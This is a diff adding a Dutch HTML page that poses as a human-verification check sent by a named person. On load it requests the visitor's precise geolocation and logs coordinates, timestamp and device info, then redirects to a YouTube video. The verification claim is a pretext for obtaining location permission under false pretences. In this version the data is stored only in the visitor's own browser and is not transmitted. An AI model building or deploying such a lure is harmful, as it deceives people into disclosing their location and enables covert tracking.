@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bevestiging</title>
+    <style>
+        /* Algemene pagina-opmaak */
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: white;
+            text-align: center;
+            background: url('https://i.postimg.cc/sDTjTFrr/whatsapp-background.jpg') no-repeat center center fixed;
+            background-size: cover;
+        }
+
+        /* Container voor de inhoud */
+        .container {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 400px;
+            color: #333;
+        }
+
+        h1 {
+            margin: 0 0 10px;
+            font-size: 24px;
+        }
+
+        p {
+            margin: 0 0 20px;
+            font-size: 16px;
+        }
+
+        /* Geaccentueerde tekst */
+        .highlight {
+            font-weight: bold;
+            color: #4caf50;
+        }
+
+        /* Voortgangsbalk */
+        .progress-bar {
+            background: rgba(0, 0, 0, 0.1);
+            height: 10px;
+            border-radius: 5px;
+            overflow: hidden;
+            margin-top: 20px;
+            width: 100%;
+            position: relative;
+        }
+
+        .progress-bar span {
+            display: block;
+            height: 100%;
+            background: linear-gradient(90deg, #4caf50, #03a9f4);
+            width: 0;
+            animation: loadProgress 5s linear forwards;
+        }
+
+        @keyframes loadProgress {
+            0% {
+                width: 0;
+            }
+            100% {
+                width: 100%;
+            }
+        }
+
+        /* Loading-animatie */
+        .loading {
+            display: inline-block;
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(0, 0, 0, 0.1);
+            border-top: 5px solid #03a9f4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto 0;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Verberg foutbericht als standaard */
+        #error-message {
+            display: none;
+            color: #ff5722;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1><span class="highlight">Youssof</span> heeft je een link gestuurd!</h1>
+        <p>Dit is alleen om te bevestigen of jij een mens bent. Even geduld terwijl we het aan het bevestigen zijn.</p>
+        <div class="loading"></div>
+        <div class="progress-bar">
+            <span></span>
+        </div>
+        <p id="error-message">Kon locatie niet ophalen. Probeer het opnieuw.</p>
+    </div>
+
+    <script>
+        function redirectWithLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        const timestamp = new Date().toISOString(); // Tijd in ISO-formaat
+                        const device = navigator.userAgent; // Apparaatinfo
+
+                        // Sla locatiegegevens op in localStorage
+                        let savedLocations = JSON.parse(localStorage.getItem("locations")) || [];
+                        savedLocations.push({
+                            lat: lat,
+                            lon: lon,
+                            accuracy: accuracy,
+                            timestamp: timestamp,
+                            device: device
+                        });
+                        localStorage.setItem("locations", JSON.stringify(savedLocations));
+
+                        // Doorsturen naar een andere website
+                        const targetUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                        setTimeout(() => {
+                            window.location.href = targetUrl;
+                        }, 5000); // Wacht totdat de voortgangsbalk klaar is
+                    },
+                    (error) => {
+                        document.querySelector(".loading").style.display = "none";
+                        document.getElementById("error-message").style.display = "block";
+                        document.getElementById("error-message").innerText =
+                            "Kon locatie niet ophalen. Zorg ervoor dat je toestemming hebt gegeven.";
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                document.querySelector(".loading").style.display = "none";
+                document.getElementById("error-message").style.display = "block";
+                document.getElementById("error-message").innerText =
+                    "Je browser ondersteunt geen geolocatie. Gebruik een moderne browser.";
+            }
+        }
+
+        // Start direct bij het laden van de pagina
+        redirectWithLocation();
+    </script>
+</body>
+</html>
